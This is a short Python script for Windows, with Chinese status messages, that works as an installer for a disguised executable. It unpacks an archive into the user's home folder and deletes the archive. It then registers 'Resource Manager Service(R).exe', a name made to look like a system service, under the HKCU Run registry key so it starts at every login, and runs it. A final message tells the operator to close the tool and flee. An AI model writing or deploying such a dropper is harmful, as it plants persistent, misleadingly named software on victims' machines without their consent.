import shutil, os
import zipfile
import win32api
import win32con

shutil.copy("UserData.zip", os.path.join(os.path.expanduser('~')))
print('文件操作 复制zip至安装目录 成功')

def unzip_file(zip_src, dst_dir):
	r = zipfile.is_zipfile(zip_src)
	if r:     
		fz = zipfile.ZipFile(zip_src, 'r')
		for file in fz.namelist():
			fz.extract(file, dst_dir)
		print('文件操作 解压zip 成功')

	else:
		print('文件操作 解压zip 失败 指定的文件不是zip文件')

unzip_file(os.path.join(os.path.expanduser('~')) + r'\UserData.zip', os.path.join(os.path.expanduser('~')))
os.remove(os.path.join(os.path.expanduser('~')) + r'\UserData.zip')
print('文件操作 删除已解压的zip 成功')

name = 'Resource Manager Service(R)' # 要添加的项值名称
path = os.path.join(os.path.expanduser('~')) + r'\UserData\PublicFiles\Protected\Resource Manager Service(R).exe' # 要添加的exe路径
# 注册表项名
KeyName = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
# 异常处理
try:
	key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, KeyName, 0, win32con.KEY_ALL_ACCESS)
	win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, path)
	win32api.RegCloseKey(key)
except:
	print('注册表操作 注册启动项 失败 未知错误')
else:
	print('注册表操作 注册启动项 成功')

print('系统操作 正在打开exe')
print('预计在五秒内安装完成 请自行关闭安装工具并跑路')
os.chdir(os.path.join(os.path.expanduser('~')) + r'\UserData\PublicFiles\Protected')
os.system('"' + os.path.join(os.path.expanduser('~')) + r'\UserData\PublicFiles\Protected\Resource Manager Service(R).exe' + '"')